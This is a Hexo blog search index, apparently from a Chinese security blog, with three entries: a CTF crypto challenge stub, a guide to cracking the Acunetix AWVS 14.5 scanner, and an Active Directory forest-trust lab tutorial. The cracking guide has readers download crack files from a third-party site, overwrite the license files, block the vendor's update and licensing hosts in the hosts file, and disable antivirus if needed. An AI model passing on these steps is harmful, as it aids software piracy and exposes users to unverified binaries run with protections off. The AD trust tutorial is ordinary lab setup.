<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTFshow 月饼杯crypto1_中秋月wp</title>
    <url>/article/b5c81d74.html</url>
    <content><![CDATA[<p>下载附件得到内容</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>fsskryenvkm<span class="token operator">~</span>jl<span class="token punctuation">&#123;</span>ejs<span class="token punctuation">&#125;</span>jwflzsnpgmifq</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>AWVS14.5.211115146破解安装教程</title>
    <url>/article/f0e9ef2f.html</url>
    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGRvc2kub3JnL2F3dnMtMTQtNS0yLyMlRTUlQUUlODklRTglQTMlODUlRTUlOEMlODUlRTQlQjglOEIlRTglQkQlQkQ=">资源包获取链接</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115141908633.png" alt="image-20220115141908633" /></p>
<h2 id="1windows破解方法"><a class="anchor" href="#1windows破解方法">#</a> ①Windows 破解方法</h2>
<p>[1] 卸载旧版 awvs, 重启电脑</p>
<p>[2] Windows 下载如下两个文件并解压 (如果出现解压失败，请使用 winrar 进行解压)</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>awvs_crack_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr></table></figure><p>解压后得到</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115142240599.png" alt="image-20220115142240599" /></p>
<p>[3] 双击 acunetix_14.5.211115146.exe 进行安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115142339357.png" alt="image-20220115142339357" /></p>
<p>填下注册信息</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115142410689.png" alt="image-20220115142410689" /></p>
<p>选择服务端口，可自行修改也可默认</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115142527309.png" alt="image-20220115142527309" /></p>
<p>一路默认 <code>next</code>  后开始安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115142628429.png" alt="image-20220115142628429" /></p>
<p>[4] 安装完成后填写之前的注册信息即可登陆</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115142920460.png" alt="image-20220115142920460" /></p>
<p>登陆后可以看到处于未激活状态</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115143003959.png" alt="image-20220115143003959" /></p>
<p>[5] 复制解压得到的两个证书文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115143048963.png" alt="image-20220115143048963" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>license_info<span class="token punctuation">.</span>json</pre></td></tr><tr><td data-num="2"></td><td><pre>wa_data<span class="token punctuation">.</span>dat</pre></td></tr></table></figure><p>到安装目录进行覆盖 (替换)</p>
<p>一般默认为如下目录，如有更改自行替换</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>C<span class="token punctuation">:</span>\ProgramData\Acunetix\shared\license</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115143208429.png" alt="image-20220115143208429" /></p>
<p>[6] 在如下目录下对 hosts 文件进行修改</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>C<span class="token punctuation">:</span>\Windows\System32\drivers\etc</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115143502185.png" alt="image-20220115143502185" /></p>
<p>在 <code>hosts</code>  文件的最后加上如下两行</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> updates<span class="token punctuation">.</span>acunetix<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> erp<span class="token punctuation">.</span>acunetix<span class="token punctuation">.</span>com</pre></td></tr></table></figure><p>注意：若无权限修改 hosts,①关闭杀毒软件②用其他 txt 编辑器进行修改，比如 notepad++ ,vscode</p>
<p>[7] 返回刷新页面即可成功激活.</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115143629716.png" alt="image-20220115143629716" /></p>
<h3 id="使用教程"><a class="anchor" href="#使用教程">#</a> 使用教程</h3>
<p>登录成功以后进入主页，点击 &quot;Add Target&quot; 如下图所示：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115144013916.png" alt="image-20220115144013916" /></p>
<p>或者选择 &quot;Targets&quot;-&gt;&quot;Add Target，如下图所示：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115144159780.png" alt="image-20220115144159780" /></p>
<p>在弹出的 &quot;Add Target&quot; 对话框中，输入要扫描的网站网址及描述，然后点击 &quot;save&quot;, 如下图所示：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115144429748.png" alt="image-20220115144429748" /></p>
<p>在打开的扫描选项对话框中，选择 “Target Information”，然后点击 “Scan”，如下图所示：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115144942522.png" alt="image-20220115144942522" /></p>
<p>在弹出的对话框中，选择 Scan Type、Report 和 Schedule，然后点击 “Create Scan”，如下图所示：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115144702593.png" alt="image-20220115144702593" /></p>
<p>之后开始扫描，等待扫描结果即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115144826815.png" alt="image-20220115144826815" /></p>
<p>点击 “Vulnerabilities” 可以查看扫描出来的脆弱项，如下图所示：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115145202769.png" alt="image-20220115145202769" /></p>
<p>点击 “Scan” 可以查看扫描的进程，如下图所示：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115145241517.png" alt="image-20220115145241517" /></p>
<p>扫描完成结束后，可以点击 “Reports&quot; 列表中的 Download 进行下载，下载完成以后，就可以打开扫描过程的整个报告。</p>
<h2 id="2linux破解方法"><a class="anchor" href="#2linux破解方法">#</a> ②Linux 破解方法</h2>
<p>[1] 卸载旧版 awvs, 重启电脑</p>
<p>[2] 下载如下两个文件到 linux 中</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_x64<span class="token punctuation">.</span>sh_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>awvs_crack_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115150233342.png" alt="image-20220115150233342" /></p>
<p>[3] 使用 <code>unrar</code>  命令进行解压</p>
<p>安装 unrar</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#下载 RAR：</span></pre></td></tr><tr><td data-num="2"></td><td><pre>wget https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>rarlab<span class="token punctuation">.</span>com<span class="token operator">/</span>rar<span class="token operator">/</span>rarlinux<span class="token operator">-</span>x64<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.0</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#解压：</span></pre></td></tr><tr><td data-num="4"></td><td><pre>tar <span class="token operator">-</span>zxvf rarlinux<span class="token operator">-</span>x64<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.0</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz<span class="token punctuation">.</span><span class="token number">1</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#安装：</span></pre></td></tr><tr><td data-num="6"></td><td><pre>cd rar</pre></td></tr><tr><td data-num="7"></td><td><pre>make</pre></td></tr><tr><td data-num="8"></td><td><pre>make install</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115150730465.png" alt="image-20220115150730465" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115150749062.png" alt="image-20220115150749062" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>unrar x <span class="token operator">-</span>pwww<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_x64<span class="token punctuation">.</span>sh_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>unrar x <span class="token operator">-</span>pwww<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org awvs_crack_www<span class="token punctuation">.</span>ddosi<span class="token punctuation">.</span>org<span class="token punctuation">.</span>rar</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115150811497.png" alt="image-20220115150811497" /></p>
<p>[4] 使用如下命令进行安装</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#赋权</span></pre></td></tr><tr><td data-num="2"></td><td><pre>chmod <span class="token operator">+</span>x acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_x64<span class="token punctuation">.</span>sh </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#安装</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">.</span><span class="token operator">/</span>acunetix_14<span class="token punctuation">.</span><span class="token number">5</span><span class="token punctuation">.</span>211115146_x64<span class="token punctuation">.</span>sh</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115150949018.png" alt="image-20220115150949018" /></p>
<p>一路 enter 同意隐私条款直到跳出来问你是否同意隐私条款，输入 yes 回车即可.</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151101732.png" alt="image-20220115151101732" /></p>
<p>填写注册信息</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151214850.png" alt="image-20220115151214850" /></p>
<p>安装完成是这个样子的:</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151332318.png" alt="image-20220115151332318" /></p>
<p>此时打开<span class="exturl" data-url="aHR0cHM6Ly8xMjcuMC4wLjE6MzQ0My8="> https://127.0.0.1:3443</span> 或者 <span class="exturl" data-url="aHR0cHM6Ly9sb2NhbGhvc3Q6MzQ0My8=">https://localhost:3443</span> 或者上面截图所示的黄色链接进行登录</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151447913.png" alt="image-20220115151447913" /></p>
<p>输入注册信息即可登陆</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151510152.png" alt="image-20220115151510152" /></p>
<p>此时可以看到还是处于未激活状态:</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151602524.png" alt="image-20220115151602524" /></p>
<p>[5] 复制解压得到的 license_info.json 和 wa_data.dat 文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151715189.png" alt="image-20220115151715189" /></p>
<p>打开如下目录粘贴进去进行替换操作.</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">/</span>home<span class="token operator">/</span>acunetix<span class="token operator">/</span><span class="token punctuation">.</span>acunetix<span class="token operator">/</span>data<span class="token operator">/</span>license<span class="token operator">/</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151753513.png" alt="image-20220115151753513" /></p>
<p>全部替换即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151838013.png" alt="image-20220115151838013" /></p>
<p>[6] 打开 hosts 文件，添加如下两行到 hosts 文件中</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> updates<span class="token punctuation">.</span>acunetix<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> erp<span class="token punctuation">.</span>acunetix<span class="token punctuation">.</span>com</pre></td></tr></table></figure><p>hosts 文件在 /etc/ 目录下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115151945326.png" alt="image-20220115151945326" /></p>
<p>修改完后如图</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115152055839.png" alt="image-20220115152055839" /></p>
<p>[7] 返回网页刷新即可看到激活成功</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115152230085.png" alt="image-20220115152230085" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115152215067.png" alt="image-20220115152215067" /></p>
<h2 id="注意事项"><a class="anchor" href="#注意事项">#</a> 注意事项</h2>
<p><code>该工具仅可用于研究使用,切勿用于非法犯罪活动,未经双方同意使用此工具攻击目标是非法的.</code> <br />
 <code>工具安全性自测,For your safety请放虚拟机运行</code></p>
<h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGRvc2kub3JnL2F3dnMtMTQtNS0yLyMlRTUlQUUlODklRTglQTMlODUlRTUlOEMlODUlRTQlQjglOEIlRTglQkQlQkQ=">Awvs 破解版 14.5.211115146 Windows+Linux+Mac cracked</span></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>Active Directory域服务：域信任</title>
    <url>/article/1df695da.html</url>
    <content><![CDATA[<h2 id="active-directory简介"><a class="anchor" href="#active-directory简介">#</a> Active Directory 简介</h2>
<p><code>Active Directory</code>  中文意思为活动目录， <code>Active Directory</code>  域内的 <code>Directory Database</code> （目录数据库）被用来存储用户账户、计算机账号、打印机域共享文件夹等对象，提供目录服务的组件就是 <code>Active Directory</code>  域服务（ <code>Active Directory Domain Service</code> ， <code>AD DS</code> ）。 <code>AD DS</code>  负责目录数据库的存储、创建、删除、修改、查询等工作。<br />
 <code> Active Directory</code>  存储有关网络上对象的信息，并让管理员和用户可以更容易地使用这些信息。  <code>Active Directory</code>  使用结构化数据存储作为目录信息的逻辑层次组织的基础。</p>
<h2 id="信任trust"><a class="anchor" href="#信任trust">#</a> 信任（Trust）</h2>
<p>两个域之间必须拥有信任关系（ <code>Trust Relationship</code> ），才可以访问对方域内的资源。而任何一个新的 <code>AD DS</code>  域被加入到域树后，这个域都会自动信任其上一层的父域，同时父域也会自动信任这个新子域。<br />
一个林中的域之间所有的 <code>Active Directory</code>  信任关系都具备双向传递性（ <code>Two-Way Transitive</code> ）。如图中：域 A 信任域 B，且域 B 信任域 <code>C</code> ，则域 <code>C</code>  中的用户访问域 <code>A</code>  中的资源。（这些用户被分配了访问权限）由于此信任工作是通过 <code>Kerberos security protocol</code>  来完成的，因此也被称为 <code>Kerveros trust</code> 。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211208214045365.png" alt="image-20211208214045365" /></p>
<p>图中域 <code>A</code>  信任域 <code>B</code> 、域 <code>B</code>  又信任域 <code>C</code> 、因此域 <code>A</code>  自动信任域 <code>C</code> ；另外域 <code>C</code>  信任域 <code>B</code> 、域 <code>B</code>  又信任域 <code>A</code> ，因此域 <code>C</code>  自动信任域 <code>A</code> 。结果是域 <code>A</code>  和域 <code>C</code>  之间会自动建立起双向的信任关系。<br />
所以当任何一个新域加入到域树后，都会自动双向信任这个域树内所有的域，只要拥有适当的权限，这个新域内的用户就可以访问其他域内的资源。同理，其他域内的用户也可以访问这个新域内的资源。</p>
<p><strong>信任协议</strong><br />
域控制器使用两种协议对用户和应用程序进行身份验证：<br />
 <code>Kerberos version 5（V5）</code> 或  <code>NTML</code> 。 <code>Kerberos V5</code>  协议是 <code>Active Directory</code>  域中的计算机的默认协议。如果事务中的任何计算机都不支持 <code>Kerberos V5</code>  协议，则使用 <code>NTML</code>  协议。</p>
<p><strong>信任方向</strong></p>
<ul>
<li>单向信任：单向信任是在两个域之间创建的单向身份验证路径。这表示在域 <code>A</code>  和域 <code>B</code>  之间的单向信任中，域 <code>A</code>  中的用户可以访问域 <code>B</code>  中的资源，但是域 <code>B</code>  中的用户无法访问域 <code>A</code>  中的资源。单向信任可以是不可传递，也可以是可传递信任，这取决于创建的信任类型。</li>
<li>双向信任： <code>Active Directory</code>  林中的所有域信任都是双向的、可传递的信任。创建新的子域时，系统将在新的子域和父域之间自动创建双向可传递信任。在双向信任中，域 <code>A</code>  信任域 <code>B</code> ，并且域 <code>B</code>  信任域 <code>A</code> 。这表示可以在两个域之间双向传递身份验证请求。双向关系可以是不可传递的，也可以是可传递的，这取决于所创建的信任类型。</li>
</ul>
<p><strong>信任类型</strong><br />
包括外部信任（不可传递）、快捷方式信任（可传递）、领域信任（可传递或不可传递）、林信任（可传递）。</p>
<h2 id="环境描述"><a class="anchor" href="#环境描述">#</a> 环境描述</h2>
<p>林功能级别是 <code>Windows Server 2003</code></p>
<p>环境配置：</p>
<table>
<thead>
<tr>
<th style="text-align:center">域控</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">DNS 服务器</th>
<th style="text-align:center">子网掩码</th>
<th style="text-align:center">网关</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Windows Server 2012</td>
<td style="text-align:center">10.211.55.20</td>
<td style="text-align:center">10.211.55.20</td>
<td style="text-align:center">255.0.0.0</td>
<td style="text-align:center">10.211.55.1</td>
</tr>
<tr>
<td style="text-align:center">Windows Server 2008</td>
<td style="text-align:center">10.211.55.25</td>
<td style="text-align:center">10.211.55.25</td>
<td style="text-align:center">255.0.0.0</td>
<td style="text-align:center">10.211.55.1</td>
</tr>
</tbody>
</table>
<h2 id="windows-server-2008上部署dc"><a class="anchor" href="#windows-server-2008上部署dc">#</a> Windows Server 2008 上部署 DC</h2>
<p>配置 IP</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209101732113.png" alt="image-20211209101732113" /></p>
<p>设置本地管理员密码为 <code>21r000@2008</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209102325890.png" alt="image-20211209102325890" /></p>
<p>按住 <code>Win+R</code>  键，打开运行，并在运行中输入 “ <code>dcpromo</code> ”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209101619671.png" alt="image-20211209101619671" /></p>
<p><code>Active Directory</code>  域服务安装向导自动打开，点击下一步；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209101710422.png" alt="image-20211209101710422" /></p>
<p>操作系统兼容性检查，点击下一步；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209101721233.png" alt="image-20211209101721233" /></p>
<p>选择在新林中新建域，点击下一步；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209102015277.png" alt="image-20211209102015277" /></p>
<p>设定 <code>FQDN</code> ，点击下一步；自动检查新的林名称和 <code>NetBIOS</code>  名称；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209102409920.png" alt="image-20211209102409920" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209102618923.png" alt="image-20211209102618923" /></p>
<p>鉴于网络中尚未部署 <code>DNS</code>  服务器，勾选 <code>DNS</code>  服务器，点击下一步；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209102702850.png" alt="image-20211209102702850" /></p>
<p>一路默认，设定目录还原模式密码为 <code>21r000@666</code> ，点击下一步；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209102819898.png" alt="image-20211209102819898" /></p>
<p>确认域控制器设置，点击下一步；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209102844340.png" alt="image-20211209102844340" /></p>
<p><code>Active Directory</code>  域服务开始自动安装；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209102854882.png" alt="image-20211209102854882" /></p>
<p><code>Active Directory</code>  域服务安装向导完成，点击完成；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211191852755.png" alt="image-20211211191852755" /></p>
<p>提示重启计算机，根据需要选择稍后重启，或者立即重启。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209103040134.png" alt="image-20211209103040134" /></p>
<h2 id="创建信任"><a class="anchor" href="#创建信任">#</a> 创建信任</h2>
<p>两个域之间创建信任很简单，麻烦的是怎么才能让两个域都能互相解析到，方法有很多种，比如，创建辅助区域、创建反向查找区域等等，这里使用的是创建辅助区域。</p>
<h3 id="建立dns辅助区域"><a class="anchor" href="#建立dns辅助区域">#</a> 建立 DNS 辅助区域</h3>
<p>1、在 <code>21r000.org</code>  的这台域控制器上面，在 <code>DNS</code>  页面右键打开 <code>DNS</code>  管理器</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209090449963.png" alt="image-20211209090449963" /></p>
<p>在 <code>DNS</code>  管理器页面选中域名，右键打开‘属性’</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209090910600.png" alt="image-20211209090910600" /></p>
<p>选择 “区域传送” 对话框，勾选 “允许区域传送” 并选择 “只允许到下列服务器”，然后选择 “编辑” 并添加 <code>21r000.local</code>  这台域控制器的 <code>DNS</code>  地址；然后选择 “确定”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209103340566.png" alt="image-20211209103340566" /></p>
<p>然后登录到 <code>21r000.local</code>  域服务器，转到 <code>DNS</code>  服务器</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104029283.png" alt="image-20211209104029283" /></p>
<p>找到 <code>dns</code>  配置后右键打开属性面板</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104123860.png" alt="image-20211209104123860" /></p>
<p>同样在 <code>DNS</code>  的转发器面板中建立到 <code>21r000.org</code>  的区域传送。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104233354.png" alt="image-20211209104233354" /></p>
<p>在接口面板选择 “只在下列 <code>IP</code>  地址”</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104335901.png" alt="image-20211209104335901" /></p>
<p>回到 <code>21r000.org</code> ，在 <code>DNS</code>  正向查找区域新建区域。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209091736921.png" alt="image-20211209091736921" /></p>
<p>新建区域向导选择辅助区域。下一步。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209091801970.png" alt="image-20211209091801970" /></p>
<p>输入 <code>21r000.local</code>  的区域名称</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209091827165.png" alt="image-20211209091827165" /></p>
<p>在主 <code>DNS</code>  服务器中添加 <code>21r000.local</code>  的服务器地址。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104441805.png" alt="image-20211209104441805" /></p>
<p>完成区域向导建立</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209092003104.png" alt="image-20211209092003104" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209092146917.png" alt="image-20211209092146917" /></p>
<p>在 <code>21r000.local</code>  域中用同样的方法建立 <code>21r000.org</code>  的辅助区域。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211193415181.png" alt="image-20211211193415181" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104602928.png" alt="image-20211209104602928" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104626365.png" alt="image-20211209104626365" /></p>
<p>创建完成后可以通过 “ <code>nslookup</code> ” 看能否互相解析到；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211193516199.png" alt="image-20211211193516199" /></p>
<p>如果有问题，可以先尝试：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Ipconfig <span class="token operator">/</span>flushdns      #清除<span class="token constant">DNS</span>缓存</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>ipconfig <span class="token operator">/</span>registerdns     #刷新所有dhcp租约，并重新注册<span class="token constant">DNS</span>名称</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>Net stop netlogon         #停止netlogon</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>Net start netlogon         #启动netlogon</pre></td></tr></table></figure><h3 id="建立林信任关系"><a class="anchor" href="#建立林信任关系">#</a> 建立林信任关系</h3>
<p>创建好辅助区域后，下面就应该创建信任了：</p>
<p>1.1、登录 <code>21r000.local</code> , 打开 <code>active directory</code>  域和信任关系，打开域的属性。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104803764.png" alt="image-20211209104803764" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209104828311.png" alt="image-20211209104828311" /></p>
<p>1.2、选择 “信任” 对话框，并选择 “新建信任”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211204048015.png" alt="image-20211211204048015" /></p>
<p>打开 “新建域信任向导”，选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209111940199.png" alt="image-20211209111940199" /></p>
<p>1.3、输入加入信任域的名称，然后选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209111956702.png" alt="image-20211209111956702" /></p>
<p>1.4、在 “信任传递” 选择 “可传递”，然后选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211193913527.png" alt="image-20211211193913527" /></p>
<p>1.5、在 “信任方向” 选择 “双向”，然后选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211194015897.png" alt="image-20211211194015897" /></p>
<p>1.6、在 “信任密码” 输入 <code>21r000@555</code> ，然后选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211194126475.png" alt="image-20211211194126475" /></p>
<p>1.7、完成建立信任向导</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211194143987.png" alt="image-20211211194143987" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211194222056.png" alt="image-20211211194222056" /></p>
<p>可以看到信任类型。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211194236207.png" alt="image-20211211194236207" /></p>
<p>2.1、在 <code>21r000.org</code>  中同样建立信任关系</p>
<p>2.2、在 “工具” 选择 “ <code>active directory</code>  域和信任关系”</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211195419983.png" alt="image-20211211195419983" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211195632992.png" alt="image-20211211195632992" /></p>
<p>2.3、在 “信任名称” 输入 <code>21r000.local</code> ，然后选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211200322521.png" alt="image-20211211200322521" /></p>
<p>2.4、在信任方向选择 “双向”，然后选择 “下一步”；</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211209093327671.png" alt="image-20211209093327671" /></p>
<p>2.5、因为在 <code>21r000.local</code>  域中已经建立了信任关系，所以这里在 “信任方” 选择 “只是这个域”，然后选择 “下一步”；（ps: 看大佬博文这里选择 “此域和指定的域” 卡住了好久！！！）</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211211201406849.png" alt="image-20211211201406849" /></p>
